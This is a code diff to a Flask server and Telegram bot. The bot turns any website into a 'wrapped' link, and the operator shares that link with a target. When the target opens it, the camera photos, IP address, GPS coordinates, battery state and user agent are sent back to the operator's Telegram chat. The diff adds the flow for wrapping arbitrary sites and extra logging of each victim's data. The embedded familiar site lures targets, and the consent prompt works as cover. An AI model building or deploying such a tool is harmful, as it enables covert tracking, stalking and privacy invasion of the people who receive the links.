@@ -43,6 +43,10 @@ def save_sessions(sessions):
 
 SESSIONS = load_sessions()
 
+# Simple in-memory chat state for Telegram conversations
+# Key: str(chat_id), Value: {"awaiting_url": bool}
+CHAT_STATE = {}
+
 # ---------- Telegram helpers ----------
 def telegram_api(method: str, data=None, files=None, timeout=30):
     if not TELEGRAM_BOT_TOKEN:
@@ -79,8 +83,9 @@ def tg_send_photo(chat_id: str, photo_path: str, caption: str = None):
     except Exception:
         return False
 
-# ---------- URL validation ----------
+# ---------- URL validation / normalization ----------
 from urllib.parse import urlparse
+
 def is_valid_http_url(u: str):
     try:
         p = urlparse(u)
@@ -88,12 +93,29 @@ def is_valid_http_url(u: str):
     except Exception:
         return False
 
+def normalize_url_for_wrap(text: str):
+    """Accepts 'example.com' or 'https://example.com' etc.
+       Returns a proper http/https URL or None."""
+    if not text:
+        return None
+    u = text.strip()
+    if not u:
+        return None
+    p = urlparse(u)
+    if not p.scheme:
+        # no scheme: assume https
+        u = "https://" + u
+        p = urlparse(u)
+    if p.scheme not in ("http", "https") or not p.netloc:
+        return None
+    return u
+
 # ---------- Endpoints ----------
 @app.route("/")
 def index():
     return ("Flask server for consented device session. Use the Telegram bot to create sessions.", 200)
 
-# Standard session creation
+# Standard session creation (bare consent page, no wrapped site)
 @app.route("/create", methods=["POST"])
 def create_session():
     data = request.get_json(silent=True) or {}
@@ -109,7 +131,13 @@ def create_session():
     save_sessions(SESSIONS)
     link = url_for("session_page", token=token, _external=True)
     if chat_id:
-        tg_send_text(chat_id, f"Session created.\nToken: {token}\nOpen: {link}\nKeep permissions allowed while page is open.")
+        tg_send_text(
+            chat_id,
+            "Plain session created.\n"
+            f"Token: {token}\n"
+            f"Open: {link}\n"
+            "Keep permissions allowed while page is open."
+        )
     return jsonify({"token": token, "link": link})
 
 @app.route("/s/<token>")
@@ -126,6 +154,8 @@ def session_page(token):
 def wrap_create():
     data = request.get_json(silent=True) or {}
     target_url = data.get("target_url", "").strip()
+
+    # Here we assume target_url is already normalized/valid
     if not is_valid_http_url(target_url):
         return jsonify({"error": "invalid_url"}), 400
 
@@ -143,7 +173,18 @@ def wrap_create():
     save_sessions(SESSIONS)
     link = url_for("wrapper_page", token=token, _external=True)
     if chat_id:
-        tg_send_text(chat_id, f"Wrap session created for {target_url}\nOpen: {link}")
+        tg_send_text(
+            chat_id,
+            "Wrapped session created.\n"
+            f"Original site: {target_url}\n"
+            f"Wrapped link: {link}\n\n"
+            "Send this wrapped link to the user.\n"
+            "When they open it:\n"
+            "• They see the original site\n"
+            "• They get a consent prompt\n"
+            "• On consent, photos, IP, battery and basic device info\n"
+            "  are sent back here while the page is open."
+        )
     return jsonify({"token": token, "link": link})
 
 @app.route("/w/<token>")
@@ -163,12 +204,15 @@ def upload_info(token):
         return "Invalid token", 404
     payload = request.get_json(silent=True) or {}
     ip = request.headers.get("X-Forwarded-For", request.remote_addr)
+    ua = request.headers.get("User-Agent", "")
+
     entry = {
         "timestamp": datetime.utcnow().isoformat(),
         "ip": ip,
         "battery": payload.get("battery"),
         "coords": payload.get("coords"),
-        "note": payload.get("note")
+        "note": payload.get("note"),
+        "user_agent": ua,
     }
     SESSIONS[token]["visits"].append(entry)
     save_sessions(SESSIONS)
@@ -177,8 +221,16 @@ def upload_info(token):
     if chat_id:
         bat = entry.get("battery")
         coords = entry.get("coords")
-        summary = f"Session {token} — info at {entry['timestamp']}\nIP: {ip}\nBattery: {bat}\nCoords: {coords}"
-        tg_send_text(chat_id, summary)
+        ua_short = (ua[:180] + "...") if ua and len(ua) > 180 else ua
+        lines = [
+            f"Session {token} — info at {entry['timestamp']}",
+            f"IP: {ip}",
+            f"Battery: {bat}",
+            f"Coords: {coords}",
+        ]
+        if ua_short:
+            lines.append(f"User-Agent: {ua_short}")
+        tg_send_text(chat_id, "\n".join(lines))
     return jsonify({"status": "ok", "stored": entry})
 
 # Single upload_image handler (final version)
@@ -199,6 +251,7 @@ def upload_image(token):
     b64 = data.get("image_b64", "")
     coords = data.get("coords")
     battery = data.get("battery")
+    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
 
     if not b64:
         return ("No image data", 400)
@@ -229,7 +282,11 @@ def upload_image(token):
     # persist filename and metadata
     sess = SESSIONS[token]
     sess.setdefault("files", []).append(fname)
-    meta = {"timestamp": timestamp, "filename": fname}
+    meta = {
+        "timestamp": timestamp,
+        "filename": fname,
+        "ip": ip,
+    }
     if coords:
         meta["coords"] = coords
     if battery:
@@ -241,12 +298,17 @@ def upload_image(token):
     chat_id = sess.get("chat_id")
     if chat_id:
         caption_parts = [f"Session {token} — photo {timestamp}"]
+        caption_parts.append(f"IP: {ip}")
         if coords:
-            caption_parts.append(f"Coords: {coords.get('lat')},{coords.get('lon')} (acc {coords.get('accuracy')})")
+            caption_parts.append(
+                f"Coords: {coords.get('lat')},{coords.get('lon')} (acc {coords.get('accuracy')})"
+            )
         if battery:
             lev = battery.get("level")
             ch = battery.get("charging")
-            caption_parts.append(f"Battery: {lev}%{' charging' if ch else ''}")
+            caption_parts.append(
+                f"Battery: {lev}%{' charging' if ch else ''}"
+            )
         caption = "\n".join(caption_parts)
         sent = tg_send_photo(chat_id, path, caption=caption)
         if not sent:
@@ -285,24 +347,68 @@ def telegram_webhook():
 
         chat = msg.get("chat", {})
         chat_id = chat.get("id")
+        chat_key = str(chat_id) if chat_id is not None else None
         text = (msg.get("text") or "").strip()
-        if not text:
+        if not text or chat_key is None:
+            return "ok", 200
+
+        # Normalize state object for this chat
+        state = CHAT_STATE.get(chat_key, {"awaiting_url": False})
+
+        # ---------- Commands ----------
+
+        # /cancel
+        if text.lower().startswith("/cancel"):
+            state["awaiting_url"] = False
+            CHAT_STATE[chat_key] = state
+            tg_send_text(
+                chat_id,
+                "Cancelled.\n"
+                "Send /start to begin a new wrapped session."
+            )
             return "ok", 200
 
         # /start
-        if text.startswith("/start"):
-            tg_send_text(chat_id, "Bot ready. Use /create <label> to create a session.")
+        if text.lower().startswith("/start"):
+            state["awaiting_url"] = True
+            CHAT_STATE[chat_key] = state
+            tg_send_text(
+                chat_id,
+                "Welcome.\n\n"
+                "Send me the website you want to wrap.\n"
+                "Examples:\n"
+                "• example.com\n"
+                "• https://yourdomain.com\n\n"
+                "I will reply with a special link that:\n"
+                "1) Opens that same site\n"
+                "2) Shows a consent screen\n"
+                "3) On consent, captures photos, IP, battery, and basic device info\n"
+                "   while the page is open.\n\n"
+                "Commands:\n"
+                "• /cancel – cancel current flow\n"
+                "• /status <token> – check a session by token"
+            )
             return "ok", 200
 
-        # /create <label>
-        if text.startswith("/create"):
+        # /create <label> (optional legacy plain session)
+        if text.lower().startswith("/create"):
             parts = text.split(maxsplit=1)
             label = parts[1] if len(parts) > 1 else ""
             try:
-                r = requests.post(url_for("create_session", _external=True), json={"label": label, "chat_id": str(chat_id)}, timeout=5)
+                r = requests.post(
+                    url_for("create_session", _external=True),
+                    json={"label": label, "chat_id": str(chat_id)},
+                    timeout=5
+                )
                 if r.ok:
                     data = r.json()
-                    tg_send_text(chat_id, f"Session created.\nToken: {data['token']}\nOpen: {data['link']}\nKeep permissions allowed while page is open.")
+                    tg_send_text(
+                        chat_id,
+                        "Plain session created (no embedded website).\n\n"
+                        f"Token: {data['token']}\n"
+                        f"Link: {data['link']}\n\n"
+                        "For site-based tracking, use /start and send a website."
+                    )
                 else:
                     tg_send_text(chat_id, f"Failed to create session: server returned {r.status_code}")
             except Exception as e:
@@ -311,7 +417,7 @@ def telegram_webhook():
             return "ok", 200
 
         # /status <token>
-        if text.startswith("/status"):
+        if text.lower().startswith("/status"):
             parts = text.split(maxsplit=1)
             if len(parts) < 2:
                 tg_send_text(chat_id, "Usage: /status <token>")
@@ -324,16 +430,85 @@ def telegram_webhook():
                     return "ok", 200
                 data = r.json()
                 visits = data.get("visits", [])
-                summary = f"Session {token}\nLabel: {data.get('label')}\nCreated: {data.get('created_at')}\nTotal events: {len(visits)}"
+                summary = (
+                    f"Session {token}\n"
+                    f"Label: {data.get('label')}\n"
+                    f"Created: {data.get('created_at')}\n"
+                    f"Total events: {len(visits)}"
+                )
                 for chunk in (summary[i:i+4000] for i in range(0, len(summary), 4000)):
                     tg_send_text(chat_id, chunk)
+                # last few visits
                 for v in visits[-5:]:
-                    txt = f"{v.get('timestamp')}\nIP: {v.get('ip')}\nBattery: {v.get('battery')}\nCoords: {v.get('coords')}"
+                    txt = (
+                        f"{v.get('timestamp')}\n"
+                        f"IP: {v.get('ip')}\n"
+                        f"Battery: {v.get('battery')}\n"
+                        f"Coords: {v.get('coords')}\n"
+                        f"User-Agent: {v.get('user_agent')}"
+                    )
                     tg_send_text(chat_id, txt)
             except Exception as e:
                 print("status command error:", e)
                 tg_send_text(chat_id, f"Failed to fetch status: {e}")
             return "ok", 200
+
+        # ---------- Non-command text: treat as website if awaiting_url ----------
+        if state.get("awaiting_url"):
+            # User is supposed to send a website now
+            candidate = text.strip()
+            url = normalize_url_for_wrap(candidate)
+            if not url:
+                tg_send_text(
+                    chat_id,
+                    "This does not look like a valid website.\n\n"
+                    "Send something like:\n"
+                    "• example.com\n"
+                    "• https://example.com\n\n"
+                    "Or send /cancel to stop."
+                )
+                return "ok", 200
+
+            # Valid URL -> create wrapped session
+            try:
+                r = requests.post(
+                    url_for("wrap_create", _external=True),
+                    json={"target_url": url, "label": "", "chat_id": str(chat_id)},
+                    timeout=5
+                )
+                if r.ok:
+                    data = r.json()
+                    state["awaiting_url"] = False
+                    CHAT_STATE[chat_key] = state
+                    tg_send_text(
+                        chat_id,
+                        "Wrapped session created.\n\n"
+                        f"Original site:\n{url}\n\n"
+                        f"Wrapped link:\n{data['link']}\n\n"
+                        "Share this wrapped link with the user.\n"
+                        "When they open it:\n"
+                        "• Your original site is embedded\n"
+                        "• They get a consent prompt\n"
+                        "• On consent, photos, IP, battery, and basic device info\n"
+                        "  are reported back to this chat."
+                    )
+                else:
+                    tg_send_text(chat_id, f"Failed to create wrapped session: server returned {r.status_code}")
+            except Exception as e:
+                print("wrap (awaiting url) error:", e)
+                tg_send_text(chat_id, "Failed to create wrapped session (server error).")
+            return "ok", 200
+
+        # ---------- Fallback ----------
+        tg_send_text(
+            chat_id,
+            "I did not understand that.\n\n"
+            "Use:\n"
+            "• /start  – create an embedded tracking link for a website\n"
+            "• /status <token> – check an existing session\n"
+            "• /create <label> – plain session without embedded site (optional)"
+        )
+        return "ok", 200
 
     except Exception as e:
         print("Telegram webhook error:", e)
